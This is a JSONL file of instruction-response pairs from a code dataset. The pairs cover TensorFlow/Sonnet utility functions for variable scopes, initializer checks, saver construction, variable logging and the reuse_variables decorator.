{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning training and testing dataset iterators.", "response": "def get_data(name, train_batch_size, test_batch_size):\n  \"\"\"Gets training and testing dataset iterators.\n\n  Args:\n    name: String. Name of dataset, either 'mnist' or 'cifar10'.\n    train_batch_size: Integer. Batch size for training.\n    test_batch_size: Integer. Batch size for testing.\n\n  Returns:\n    Dict containing:\n      train_iterator: A tf.data.Iterator, over training data.\n      test_iterator: A tf.data.Iterator, over test data.\n      num_classes: Integer. Number of class labels.\n  \"\"\"\n  if name not in ['mnist', 'cifar10']:\n    raise ValueError(\n        'Expected dataset \\'mnist\\' or \\'cifar10\\', but got %s' % name)\n  dataset = getattr(tf.keras.datasets, name)\n  num_classes = 10\n\n  # Extract the raw data.\n  raw_data = dataset.load_data()\n  (images_train, labels_train), (images_test, labels_test) = raw_data\n\n  # Normalize inputs and fix types.\n  images_train = images_train.astype(np.float32) / 255.\n  images_test = images_test.astype(np.float32) / 255.\n  labels_train = labels_train.astype(np.int32).squeeze()\n  labels_test = labels_test.astype(np.int32).squeeze()\n\n  # Add a dummy 'color channel' dimension if it is not present.\n  if images_train.ndim == 3:\n    images_train = np.expand_dims(images_train, -1)\n    images_test = np.expand_dims(images_test, -1)\n\n  # Put the data onto the graph as constants.\n  train_data = tf.data.Dataset.from_tensor_slices((images_train, labels_train))\n  test_data = tf.data.Dataset.from_tensor_slices((images_test, labels_test))\n\n  # Create iterators for each dataset.\n  train_iterator = (\n      train_data\n      # Note: For larger datasets e.g. ImageNet, it will not be feasible to have\n      # a shuffle buffer this large.\n      .shuffle(buffer_size=len(images_train))\n      .batch(train_batch_size)\n      .repeat()\n      .make_one_shot_iterator()\n  )\n  test_iterator = test_data.batch(test_batch_size).make_initializable_iterator()\n  return dict(\n      train_iterator=train_iterator,\n      test_iterator=test_iterator,\n      num_classes=num_classes)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_variable_scope_name(value):\n  # If the object has a \"variable_scope\" property, use it.\n  value = getattr(value, \"variable_scope\", value)\n  if isinstance(value, tf.VariableScope):\n    return value.name\n  elif isinstance(value, six.string_types):\n    return value\n  else:\n    raise ValueError(\"Not a variable scope: {}\".format(value))", "response": "Returns the name of the variable scope indicated by the given value."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a tuple of tf. Variable s in a given scope for a given collection.", "response": "def get_variables_in_scope(scope, collection=tf.GraphKeys.TRAINABLE_VARIABLES):\n  \"\"\"Returns a tuple `tf.Variable`s in a scope for a given collection.\n\n  Args:\n    scope: `tf.VariableScope` or string to retrieve variables from.\n    collection: Collection to restrict query to. By default this is\n        `tf.Graphkeys.TRAINABLE_VARIABLES`, which doesn't include non-trainable\n        variables such as moving averages.\n\n  Returns:\n    A tuple of `tf.Variable` objects.\n  \"\"\"\n  scope_name = get_variable_scope_name(scope)\n\n  if scope_name:\n    # Escape the name in case it contains any \".\" characters. Add a closing\n    # slash so we will not search any scopes that have this scope name as a\n    # prefix.\n    scope_name = re.escape(scope_name) + \"/\"\n\n  return tuple(tf.get_collection(collection, scope_name))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_variables_in_module(module,\n                            collection=tf.GraphKeys.TRAINABLE_VARIABLES):\n  \"\"\"Returns tuple of `tf.Variable`s declared inside an `snt.Module`.\n\n  Note that this operates by searching the variable scope a module contains,\n  and so does not know about any modules which were constructed elsewhere but\n  used inside this module.\n\n  Args:\n    module: `snt.Module` instance to query the scope of.\n    collection: Collection to restrict query to. By default this is\n      `tf.Graphkeys.TRAINABLE_VARIABLES`, which doesn't include non-trainable\n      variables such as moving averages.\n\n  Returns:\n    A tuple of `tf.Variable` objects.\n\n  Raises:\n    NotConnectedError: If the module is not connected to the Graph.\n  \"\"\"\n  return module.get_variables(collection=collection)", "response": "Returns a tuple of tf. Variable s declared inside a module."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if all items in the dictionary and all subdictionaries with callables are callables.", "response": "def _check_nested_callables(dictionary, object_name):\n  \"\"\"Checks if all items in the dictionary and in subdictionaries are callables.\n\n  Args:\n    dictionary: Dictionary of callables or other dictionaries with callables.\n    object_name: The name of the object that is expected in the dictionary.\n      E.g. 'Initializer', 'Partitioner' or 'Regularizer'. The first letter\n      should be capitalised as this will be the first word in the error message.\n\n  Raises:\n    TypeError: If the dictionary contains something that is not either a\n      dictionary or a callable.\n  \"\"\"\n  for key, entry in six.iteritems(dictionary):\n    if hasattr(entry, \"items\"):\n      _check_nested_callables(entry, object_name)\n    elif not callable(entry):\n      raise TypeError(\n          \"{} for '{}' is not a callable function or dictionary\"\n          .format(object_name, key))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _assert_is_dictlike(maybe_dictlike, valid_keys):\n  # This covers a common mistake when people use incorrect dictionary nesting\n  # for initializers / partitioners etc. The previous error message was quite\n  # opaque, this should be much clearer.\n  if not hasattr(maybe_dictlike, \"__getitem__\"):\n    raise TypeError(\n        \"Expected a dict-like object with possible keys %s, received %s\" %\n        (str(valid_keys), str(maybe_dictlike)))", "response": "Raises a TypeError iff maybe_dictlike is not a dictlike object."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nchecks that the given initializers are valid and that all of the keys in are in the given keys.", "response": "def check_initializers(initializers, keys):\n  \"\"\"Checks the given initializers.\n\n  This checks that `initializers` is a dictionary that only contains keys in\n  `keys`, and furthermore the entries in `initializers` are functions or\n  further dictionaries (the latter used, for example, in passing initializers\n  to modules inside modules) that must satisfy the same constraints.\n\n  Args:\n    initializers: Dictionary of initializers (allowing nested dictionaries) or\n      None.\n    keys: Iterable of valid keys for `initializers`.\n\n  Returns:\n    Copy of checked dictionary of initializers. If `initializers=None`, an empty\n    dictionary will be returned.\n\n  Raises:\n    KeyError: If an initializer is provided for a key not in `keys`.\n    TypeError: If a provided initializer is not a callable function, or\n      `initializers` is not a Mapping.\n  \"\"\"\n  if initializers is None:\n    return {}\n  _assert_is_dictlike(initializers, valid_keys=keys)\n\n  keys = set(keys)\n\n  if not set(initializers) <= keys:\n    extra_keys = set(initializers) - keys\n    raise KeyError(\n        \"Invalid initializer keys {}, initializers can only \"\n        \"be provided for {}\".format(\n            \", \".join(\"'{}'\".format(key) for key in extra_keys),\n            \", \".join(\"'{}'\".format(key) for key in keys)))\n\n  _check_nested_callables(initializers, \"Initializer\")\n\n  return dict(initializers)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking that the given partitioners are valid and that they are nested dictionaries.", "response": "def check_partitioners(partitioners, keys):\n  \"\"\"Checks the given partitioners.\n\n  This checks that `partitioners` is a dictionary that only contains keys in\n  `keys`, and furthermore the entries in `partitioners` are functions or\n  further dictionaries (the latter used, for example, in passing partitioners\n  to modules inside modules) that must satisfy the same constraints.\n\n  Args:\n    partitioners: Dictionary of partitioners (allowing nested dictionaries) or\n        None.\n    keys: Iterable of valid keys for `partitioners`.\n\n  Returns:\n    Checked dictionary of partitioners. If `partitioners=None`, an empty\n    dictionary will be returned.\n\n  Raises:\n    KeyError: If an partitioner is provided for a key not in `keys`.\n    TypeError: If a provided partitioner is not a callable function, or\n      `partitioners` is not a Mapping.\n  \"\"\"\n  if partitioners is None:\n    return {}\n  _assert_is_dictlike(partitioners, valid_keys=keys)\n\n  keys = set(keys)\n\n  if not set(partitioners) <= keys:\n    extra_keys = set(partitioners) - keys\n    raise KeyError(\n        \"Invalid partitioner keys {}, partitioners can only \"\n        \"be provided for {}\".format(\n            \", \".join(\"'{}'\".format(key) for key in extra_keys),\n            \", \".join(\"'{}'\".format(key) for key in keys)))\n\n  _check_nested_callables(partitioners, \"Partitioner\")\n\n  return partitioners"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_regularizers(regularizers, keys):\n  if regularizers is None:\n    return {}\n  _assert_is_dictlike(regularizers, valid_keys=keys)\n\n  keys = set(keys)\n\n  if not set(regularizers) <= keys:\n    extra_keys = set(regularizers) - keys\n    raise KeyError(\n        \"Invalid regularizer keys {}, regularizers can only \"\n        \"be provided for {}\".format(\n            \", \".join(\"'{}'\".format(key) for key in extra_keys),\n            \", \".join(\"'{}'\".format(key) for key in keys)))\n\n  _check_nested_callables(regularizers, \"Regularizer\")\n\n  return dict(regularizers)", "response": "Checks that regularizers are valid and that all of the keys in keys are valid."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _is_scope_prefix(scope_name, prefix_name):\n\n  if not prefix_name:\n    return True\n\n  if not scope_name.endswith(\"/\"):\n    scope_name += \"/\"\n\n  if not prefix_name.endswith(\"/\"):\n    prefix_name += \"/\"\n\n  return scope_name.startswith(prefix_name)", "response": "Checks that prefix_name is a proper scope prefix of scope_name."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_sliced_variables(var_list):\n  unsliced_variables = []\n  sliced_variables = collections.defaultdict(lambda: [])\n  for var in var_list:\n    if var._save_slice_info:\n      sliced_variables[var._save_slice_info.full_name].append(var)\n    else:\n      unsliced_variables.append(var)\n  return unsliced_variables, sliced_variables", "response": "Separates the sliced ( partitioned ) and unsliced variables in var_list."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a custom getter that routes to a specific pattern matching the requested variable name.", "response": "def custom_getter_router(custom_getter_map, name_fn):\n  \"\"\"Creates a custom getter than matches requests to dict of custom getters.\n\n  Custom getters are callables which implement the\n  [custom getter API]\n  (https://www.tensorflow.org/versions/r1.0/api_docs/python/tf/get_variable).\n\n  The returned custom getter dispatches calls based on pattern matching the\n  name of the requested variable to the keys of custom_getter_map. For example,\n\n      {\n        \".*/w\": snt.custom_getters.stop_gradient,\n      }\n\n  will match all variables named with the suffix \"/w\". The `name_fn` is\n  provided to allow processing of the name, such as stripping off a scope prefix\n  before matching.\n\n  Args:\n    custom_getter_map: Mapping of regular expressions to custom getter\n      functions.\n    name_fn: Callable to map variable name through before matching to regular\n      expressions. This might, for example, strip off a scope prefix.\n\n  Returns:\n    A custom getter.\n\n  Raises:\n    TypeError: If an entry in `custom_getter_map` is not a callable function.\n  \"\"\"\n\n  for custom_getter in custom_getter_map.values():\n    if not callable(custom_getter):\n      raise TypeError(\"Given custom_getter is not callable.\")\n\n  def _custom_getter(getter, name, *args, **kwargs):\n    \"\"\"A custom getter that routes based on pattern matching the variable name.\n\n    Args:\n      getter: The true getter to call.\n      name: The fully qualified variable name, i.e. including all scopes.\n      *args: Arguments, in the same format as tf.get_variable.\n      **kwargs: Keyword arguments, in the same format as tf.get_variable.\n\n    Returns:\n      The return value of the appropriate custom getter. If there are no\n      matches, it returns the return value of `getter`.\n\n    Raises:\n      KeyError: If more than one pattern matches the variable name.\n    \"\"\"\n    bare_name = name_fn(name)\n    matches = [\n        (custom_getter, pattern)\n        for pattern, custom_getter in custom_getter_map.items()\n        if re.match(pattern, bare_name) is not None]\n\n    num_matches = len(matches)\n\n    if num_matches == 0:\n      return getter(name, *args, **kwargs)\n    elif num_matches == 1:\n      custom_getter, pattern = matches[0]\n      return custom_getter(getter, name, *args, **kwargs)\n    else:\n      raise KeyError(\"More than one custom_getter matched {} ({}): {}\".format(\n          name, bare_name, [pattern for _, pattern in matches]))\n\n  return _custom_getter"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_normalized_variable_map(scope_or_module,\n                                collection=tf.GraphKeys.GLOBAL_VARIABLES,\n                                context=None,\n                                group_sliced_variables=True):\n  \"\"\"Builds map of `tf.Variable`s in scope or module with normalized names.\n\n  The names of the variables are normalized to remove the scope prefix.\n\n  Args:\n    scope_or_module: Scope or module to build map from.\n    collection: Collection to restrict query to. By default this is\n        `tf.Graphkeys.GLOBAL_VARIABLES`, which includes non-trainable variables\n        such as moving averages.\n    context: Scope or module, identical to or parent of `scope`. If given, this\n        will be used as the stripped prefix. By default `None`, which means\n        `context=scope`.\n    group_sliced_variables: Boolean, if set to True, sliced variables are\n       grouped together in the returned map; if set to False, each partition of\n       a sliced variable is a separate (key, value) pair.\n\n  Returns:\n    Dictionary mapping normalized variable name to `tf.Variable`, or a list\n        of `tf.Variables` if the variable is a sliced (partitioned) variable.\n\n  Raises:\n    ValueError: If `context` is given but is not a proper prefix of `scope`.\n  \"\"\"\n  scope_name = get_variable_scope_name(scope_or_module)\n\n  if context is None:\n    context = scope_or_module\n\n  prefix = get_variable_scope_name(context)\n  prefix_length = len(prefix) + 1 if prefix else 0\n\n  if not _is_scope_prefix(scope_name, prefix):\n    raise ValueError(\"Scope '{}' is not prefixed by '{}'.\".format(\n        scope_name, prefix))\n\n  variables = get_variables_in_scope(scope_name, collection)\n\n  if not group_sliced_variables:\n    single_vars = variables\n    grouped_vars = dict()\n  else:\n    single_vars, grouped_vars = _get_sliced_variables(variables)\n\n  var_map = {var.op.name[prefix_length:]: var for var in single_vars}\n  for full_name, var_group in grouped_vars.items():\n    name = full_name[prefix_length:]\n    if name in var_map:\n      raise ValueError(\"Mixing slices and non-slices with the same name: \" +\n                       str(name))\n    var_map[name] = var_group\n  return var_map", "response": "Returns a dictionary mapping normalized variable names to tf. Variables."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_saver(scope, collections=(tf.GraphKeys.GLOBAL_VARIABLES,),  # pylint: disable=redefined-outer-name\n              context=None, **kwargs):\n  \"\"\"Builds a `tf.train.Saver` for the scope or module, with normalized names.\n\n  The names of the variables are normalized to remove the scope prefix.\n  This allows the same variables to be restored into another similar scope or\n  module using a complementary `tf.train.Saver` object.\n\n  Args:\n    scope: Scope or module. Variables within will be saved or restored.\n    collections: Sequence of collections of variables to restrict\n        `tf.train.Saver` to. By default this is `tf.GraphKeys.GLOBAL_VARIABLES`\n        which includes moving averages variables as well as trainable variables.\n    context: Scope or module, identical to or parent of `scope`. If given, this\n        will be used as the stripped prefix.\n    **kwargs: Extra keyword arguments to pass to tf.train.Saver.\n\n  Returns:\n    A `tf.train.Saver` object for Variables in the scope or module.\n  \"\"\"\n\n  variable_map = {}\n  for collection in collections:\n    variable_map.update(get_normalized_variable_map(scope, collection, context))\n\n  return tf.train.Saver(var_list=variable_map, **kwargs)", "response": "Builds a tf. train. Saver object for the given scope or module."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nyield an iterator over ( string tf. Variable pairs in variable map.", "response": "def variable_map_items(variable_map):\n  \"\"\"Yields an iterator over (string, variable) pairs in the variable map.\n\n  In general, variable maps map variable names to either a `tf.Variable`, or\n  list of `tf.Variable`s (in case of sliced variables).\n\n  Args:\n    variable_map: dict, variable map over which to iterate.\n\n  Yields:\n    (string, tf.Variable) pairs.\n  \"\"\"\n  for key, var_or_vars in six.iteritems(variable_map):\n    if isinstance(var_or_vars, (list, tuple)):\n      for variable in var_or_vars:\n        yield key, variable\n    else:\n      yield key, var_or_vars"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_vars_to_collections(variables):\n  var_to_collections = collections.defaultdict(lambda: [])\n  if isinstance(variables, dict):\n    variables = list(v for _, v in variable_map_items(variables))\n  for graph in set(v.graph for v in variables):\n    for collection_name in list(graph.collections):\n      entries = set(entry for entry in graph.get_collection(collection_name)\n                    if isinstance(entry, tf.Variable))\n      # For legacy reasons, tf.GraphKeys.GLOBAL_VARIABLES == \"variables\".\n      # Correcting for this here, to avoid confusion.\n      if collection_name == tf.GraphKeys.GLOBAL_VARIABLES:\n        collection_name = \"global_variables\"\n      for var in entries.intersection(variables):\n        var_to_collections[var].append(collection_name)\n  return var_to_collections", "response": "Returns a dict mapping variables to the collections they appear in."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _format_device(var):\n  if var.dtype.name.endswith(\"_ref\"):\n    resource_var_annotation = \"(legacy)\"\n  else:\n    resource_var_annotation = \"(resource)\"\n\n  if var.device:\n    return \"{} {}\".format(var.device, resource_var_annotation)\n  else:\n    return resource_var_annotation", "response": "Formats the device with an annotation specifying ResourceVariable."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef format_variables(variables, join_lines=True):\n  rows = []\n  rows.append((\"Variable\", \"Shape\", \"Type\", \"Collections\", \"Device\"))\n  var_to_collections = _get_vars_to_collections(variables)\n  for var in sorted(variables, key=lambda var: var.op.name):\n    if var.get_shape().is_fully_defined():\n      shape = \"x\".join(str(dim) for dim in var.get_shape().as_list())\n    else:\n      shape = \"undefined\"\n    dtype = repr(var.dtype.base_dtype).replace(\"tf.\", \"\")\n    coll = \", \".join(sorted(var_to_collections[var]))\n    rows.append((var.op.name, shape, dtype, coll, _format_device(var)))\n  return _format_table(rows, join_lines)", "response": "Takes a collection of variables and formats it as a table."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ntaking a key - to - variable map and formats it as a table.", "response": "def format_variable_map(variable_map, join_lines=True):\n  \"\"\"Takes a key-to-variable map and formats it as a table.\"\"\"\n  rows = []\n  rows.append((\"Key\", \"Variable\", \"Shape\", \"Type\", \"Collections\", \"Device\"))\n  var_to_collections = _get_vars_to_collections(variable_map)\n\n  sort_key = lambda item: (item[0], item[1].name)\n  for key, var in sorted(variable_map_items(variable_map), key=sort_key):\n    shape = \"x\".join(str(dim) for dim in var.get_shape().as_list())\n    dtype = repr(var.dtype.base_dtype).replace(\"tf.\", \"\")\n    coll = \", \".join(sorted(var_to_collections[var]))\n    rows.append((key, var.op.name, shape, dtype, coll, _format_device(var)))\n  return _format_table(rows, join_lines)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nlogging variables for either or all variables.", "response": "def log_variables(variables=None):\n  \"\"\"Logs variable information.\n\n  This function logs the name, shape, type, collections, and device for either\n  all variables or a given iterable of variables. In the \"Device\" columns,\n  the nature of the variable (legacy or resource (for ResourceVariables)) is\n  also specified in parenthesis.\n\n  Args:\n    variables: iterable of variables; if not provided, then all variables\n        (in the default graph) are logged.\n  \"\"\"\n  if variables is None:\n    variables = tf.global_variables() + tf.local_variables()\n  for row in format_variables(variables, join_lines=False):\n    tf.logging.info(row)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning human readable string of how much memory num_bytes fills.", "response": "def _num_bytes_to_human_readable(num_bytes):\n  \"\"\"Returns human readable string of how much memory `num_bytes` fills.\"\"\"\n  if num_bytes < (2 ** 10):\n    return \"%d B\" % num_bytes\n  elif num_bytes < (2 ** 20):\n    return \"%.3f KB\" % (float(num_bytes) / (2 ** 10))\n  elif num_bytes < (2 ** 30):\n    return \"%.3f MB\" % (float(num_bytes) / (2 ** 20))\n  else:\n    return \"%.3f GB\" % (float(num_bytes) / (2 ** 30))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef summarize_variables(variables=None):\n\n  variable_counts = count_variables_by_type(variables=variables)\n  total_num_scalars = 0\n  total_num_bytes = 0\n\n  # Sort by string representation of type name, so output is deterministic.\n  for dtype in sorted(variable_counts,\n                      key=lambda dtype: \"%r\" % dtype):\n    var_info_for_type = variable_counts[dtype]\n    num_bytes = var_info_for_type[\"num_scalars\"] * dtype.size\n    total_num_scalars += var_info_for_type[\"num_scalars\"]\n    total_num_bytes += num_bytes\n    tf.logging.info(\"%r: %d variables comprising %d scalars, %s\",\n                    dtype, var_info_for_type[\"num_variables\"],\n                    var_info_for_type[\"num_scalars\"],\n                    _num_bytes_to_human_readable(num_bytes))", "response": "Logs a summary of the number of variables comprising scalars and total memory consumed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a dict mapping dtypes to number of variables and scalars.", "response": "def count_variables_by_type(variables=None):\n  \"\"\"Returns a dict mapping dtypes to number of variables and scalars.\n\n  Args:\n    variables: iterable of `tf.Variable`s, or None. If None is passed, then all\n      global and local variables in the current graph are used.\n\n  Returns:\n    A dict mapping tf.dtype keys to a dict containing the keys 'num_scalars' and\n      'num_variables'.\n  \"\"\"\n  if variables is None:\n    variables = tf.global_variables() + tf.local_variables()\n  unique_types = set(v.dtype.base_dtype for v in variables)\n  results_dict = {}\n  for dtype in unique_types:\n    if dtype == tf.string:\n      tf.logging.warning(\n          \"NB: string Variables present. The memory usage for these  Variables \"\n          \"will not be accurately computed as it depends on the exact strings \"\n          \"stored in a particular session.\")\n    vars_of_type = [v for v in variables if v.dtype.base_dtype == dtype]\n    num_scalars = sum(v.shape.num_elements() for v in vars_of_type)\n    results_dict[dtype] = {\n        \"num_variables\": len(vars_of_type),\n        \"num_scalars\": num_scalars\n    }\n  return results_dict"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nwrap an arbitrary method so it does variable sharing. This decorator creates variables the first time it calls `method`, and reuses them for subsequent calls. The object that calls `method` provides a `tf.VariableScope`, either as a `variable_scope` attribute or as the return value of an `_enter_variable_scope()` method. The first time the wrapped method is invoked, it enters the caller's `tf.VariableScope` with `reuse=False`. On all subsequent calls it enters the same variable scope with `reuse=True`. Variables are created in the context of the `tf.VariableScope` provided by the caller object. Ops are created with an additional `tf.name_scope()`, which adds a scope for the wrapped method name. For example: ```python class MyClass(object): def __init__(self, name): with tf.variable_scope(None, default_name=name) as variable_scope: self.variable_scope = variable_scope @snt.reuse_variables def add_x(self, tensor): x = tf.get_variable(\"x\", shape=tensor.get_shape()) return tensor + x module = MyClass(\"my_module_name\") input_tensor = tf.zeros(shape=(5,)) # This creates the variable \"my_module_name/x\" # and op \"my_module_name/add_x/add\" output = module.add_x(input_tensor) ``` For performance when executing eagerly it may be desirable to additionally annotate these methods using `defun`, such that they are encapsulated as graph functions. This is not recommended if your method returns a variable since the output of `defun` would be an op that returned the variable's value when evaluated (rather than the variable instance). ```python class FooModule(snt.AbstractModule): def _build(self, inputs): return complex_math(inputs) @tfe.defun @snt.reuse_variables def more_complex_stuff(self, inputs): return more_complex_math(inputs) ``` Args: method: The method to wrap. Returns: The wrapped method.", "response": "def reuse_variables(method):\n  \"\"\"Wraps an arbitrary method so it does variable sharing.\n\n  This decorator creates variables the first time it calls `method`, and reuses\n  them for subsequent calls. The object that calls `method` provides a\n  `tf.VariableScope`, either as a `variable_scope` attribute or as the return\n  value of an `_enter_variable_scope()` method.\n\n  The first time the wrapped method is invoked, it enters the caller's\n  `tf.VariableScope` with `reuse=False`. On all subsequent calls it enters the\n  same variable scope with `reuse=True`.\n\n  Variables are created in the context of the `tf.VariableScope` provided by the\n  caller object. Ops are created with an additional `tf.name_scope()`, which\n  adds a scope for the wrapped method name. For example:\n\n  ```python\n  class MyClass(object):\n\n    def __init__(self, name):\n      with tf.variable_scope(None, default_name=name) as variable_scope:\n        self.variable_scope = variable_scope\n\n    @snt.reuse_variables\n    def add_x(self, tensor):\n      x = tf.get_variable(\"x\", shape=tensor.get_shape())\n      return tensor + x\n\n  module = MyClass(\"my_module_name\")\n  input_tensor = tf.zeros(shape=(5,))\n\n  # This creates the variable \"my_module_name/x\"\n  # and op \"my_module_name/add_x/add\"\n  output = module.add_x(input_tensor)\n  ```\n\n  For performance when executing eagerly it may be desirable to additionally\n  annotate these methods using `defun`, such that they are encapsulated as\n  graph functions. This is not recommended if your method returns a variable\n  since the output of `defun` would be an op that returned the variable's value\n  when evaluated (rather than the variable instance).\n\n  ```python\n  class FooModule(snt.AbstractModule):\n    def _build(self, inputs):\n      return complex_math(inputs)\n\n    @tfe.defun\n    @snt.reuse_variables\n    def more_complex_stuff(self, inputs):\n      return more_complex_math(inputs)\n  ```\n\n  Args:\n    method: The method to wrap.\n\n  Returns:\n    The wrapped method.\n  \"\"\"\n  initialized_variable_scopes_eager = set()\n  initialized_variable_scopes_graph = weakref.WeakKeyDictionary()\n\n  # Ensure that the argument passed in is really a method by checking that the\n  # first positional argument to it is \"self\".\n  arg_spec = inspect.getargspec(method)\n  is_method = arg_spec.args and arg_spec.args[0] == \"self\"\n\n  if not is_method:\n    raise TypeError(\"reuse_variables can only be used with methods.\")\n\n  @wrapt.decorator\n  def eager_test(method, obj, args, kwargs):\n    \"\"\"Validates runtime state in eager mode.\"\"\"\n    # If @reuse_variables is combined with @property, obj is passed in args\n    # and method is still unbound at this stage.\n    if obj is None:\n      obj = args[0]\n\n    if tf.executing_eagerly() and not hasattr(obj, \"_template\"):\n      raise ValueError(\n          \"reuse_variables is not supported in eager mode except in Sonnet \"\n          \"modules.\")\n\n    return method(*args, **kwargs)\n\n  @wrapt.decorator\n  def call_method(method, obj, args, kwargs):\n    \"\"\"Calls `method` with a variable scope whose reuse flag is set correctly.\n\n    The first time the wrapper is called it creates a\n    `(tf.Graph, tf.VariableScope)` key and checks it for membership in\n    `initialized_variable_scopes`. The check is `False` if and only if this is\n    the first time the wrapper has been called with the key, otherwise the\n    check is `True`. The result of this check is used as the `reuse` flag for\n    entering the provided variable scope before calling `method`.\n\n    Here are two examples of how to use the reuse_variables decorator.\n\n    1. Decorate an arbitrary instance method with a `variable_scope` attribute:\n\n      ```python\n      class Reusable(object):\n\n        def __init__(self, name):\n          with tf.variable_scope(None, default_name=name) as vs:\n            self.variable_scope = vs\n\n        @snt.reuse_variables\n        def add_a(self, input_tensor):\n          a = tf.get_variable(\"a\", shape=input_tensor.get_shape())\n          return a + input_tensor\n\n      obj = Reusable(\"reusable\")\n      x = tf.constant(5.0)\n      out1 = obj.add_a(x)\n      out2 = obj.add_a(x)\n      # out1 == out2\n      ```\n\n    2. Decorating a snt.AbstractModule instance method:\n\n      ```python\n      class ReusableModule(snt.AbstractModule):\n\n        @snt.reuse_variables\n        def add_a(self, input_tensor):\n          a = tf.get_variable(\"a\", shape=input_tensor.get_shape())\n          return a + input_tensor\n\n        # We don't need @snt.reuse_variables here because build is\n        wrapped by # `tf.make_template` inside `snt.AbstractModule`.\n        def _build(self, input_tensor):\n          b = tf.get_variable(\"b\", shape=input_tensor.get_shape())\n          return b + self.add_a(input_tensor)\n\n      obj = Reusable(\"reusable\")\n      x = tf.constant(5.0)\n      out1 = obj(x)\n      out2 = obj(x)\n      # out1 == out2\n      ```\n\n    Args:\n      method: The method to wrap.\n      obj: The object instance passed to the wrapped method.\n      args: The positional arguments (Tensors) passed to the wrapped method.\n      kwargs: The keyword arguments passed to the wrapped method.\n\n    Returns:\n      Output of the wrapped method.\n\n    Raises:\n      ValueError: If no variable scope is provided or if `method` is a method\n                  and a variable_scope keyword argument is also provided.\n    \"\"\"\n\n    # If @reuse_variables is combined with @property, obj is passed in args\n    # and method is still unbound at this stage.\n    if obj is None:\n      obj = args[0]\n\n    def default_context_manager(reuse=None):\n      variable_scope = obj.variable_scope\n      return tf.variable_scope(variable_scope, reuse=reuse)\n\n    variable_scope_context_manager = getattr(obj, \"_enter_variable_scope\",\n                                             default_context_manager)\n\n    with tf.init_scope():\n      # We need `init_scope` incase we're running inside a defun. In that case\n      # what we want is information about where the function will be called not\n      # where the function is being built.\n      graph = tf.get_default_graph()\n      will_call_in_eager_context = tf.executing_eagerly()\n\n    if will_call_in_eager_context:\n      initialized_variable_scopes = initialized_variable_scopes_eager\n    else:\n      if graph not in initialized_variable_scopes_graph:\n        initialized_variable_scopes_graph[graph] = set()\n      initialized_variable_scopes = initialized_variable_scopes_graph[graph]\n\n    # Temporarily enter the variable scope to capture it\n    with variable_scope_context_manager() as tmp_variable_scope:\n      variable_scope = tmp_variable_scope\n\n    reuse = variable_scope.name in initialized_variable_scopes\n\n    # Enter the pure variable scope with reuse correctly set\n    with variable_scope_ops._pure_variable_scope(  # pylint:disable=protected-access\n        variable_scope, reuse=reuse) as pure_variable_scope:\n      current_name_scope = tf.get_default_graph().get_name_scope()\n      # Force tf.name_scope to treat current_name_scope as an \"absolute\" scope\n      # so we can re-enter it.\n      if current_name_scope and current_name_scope[-1] != \"/\":\n        current_name_scope += \"/\"\n      with tf.name_scope(current_name_scope):\n        module_name = pure_variable_scope.name\n        method_name = to_snake_case(method.__name__)\n        method_name_scope = \"{}/{}\".format(module_name, method_name)\n        with tf.name_scope(method_name_scope) as scope:\n          if hasattr(obj, \"_capture_variables\"):\n            with obj._capture_variables():  # pylint: disable=protected-access\n              out_ops = method(*args, **kwargs)\n          else:\n            out_ops = method(*args, **kwargs)\n      initialized_variable_scopes.add(pure_variable_scope.name)\n      try:\n        # If `obj` is a Sonnet module, let it know it's been connected\n        # to the TF graph.\n        obj._is_connected = True  # pylint: disable=protected-access\n        if not tf.executing_eagerly():\n          obj._add_connected_subgraph(  # pylint: disable=protected-access\n              method, out_ops, scope, args, kwargs)\n      except AttributeError:\n        pass\n    return out_ops\n\n  return eager_test(call_method(method))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef name_for_callable(func):\n  if isinstance(func, functools.partial):\n    return name_for_callable(func.func)\n\n  try:\n    name = func.__name__\n  except AttributeError:\n    return None\n\n  if name == \"<lambda>\":\n    return None\n  else:\n    return to_snake_case(name)", "response": "Returns a module name for a callable or None if no name can be found."}
